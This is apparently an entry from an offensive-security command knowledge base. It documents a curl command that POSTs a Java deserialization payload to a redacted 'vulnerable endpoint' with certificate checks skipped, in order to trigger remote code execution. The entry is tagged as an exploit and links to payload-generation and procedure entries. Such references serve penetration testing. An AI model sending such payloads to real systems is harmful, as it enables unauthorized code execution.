---
id: cmd-curl-rce
data: 'curl https://█████████/monitor/EXPROD_1 --data-binary @payload -k'
tags:
  - exploit
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:27.652Z'
verified: false
validated: true
submitted: true
---
# curl-send-rce-payload

## Command

```bash
curl https://█████████/monitor/EXPROD_1 --data-binary @payload -k
```

## Description

Sends the binary deserialization payload as POST data to the vulnerable endpoint, ignoring SSL certificate validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| https://█████████/monitor/EXPROD_1 | Target URL | Yes |
| --data-binary | Sends file as binary data | Yes |
| @payload | Reads payload from file | Yes |
| -k | Insecure mode, skips SSL verification | Yes |

## Examples

### Basic Usage

```bash
curl https://target/monitor/EXPROD_1 --data-binary @payload -k
```

### Advanced Usage

```bash
curl -X POST https://target/endpoint --data-binary @payload -k -v
```

## Expected Output

HTTP/1.1 200 OK
<server response body>
Triggers deserialization and DNS query on success.

## Related

- [[commands/java-generate-urldns-payload]]
- [[procedures/Send-RCE-Payload-to-Endpoint]]
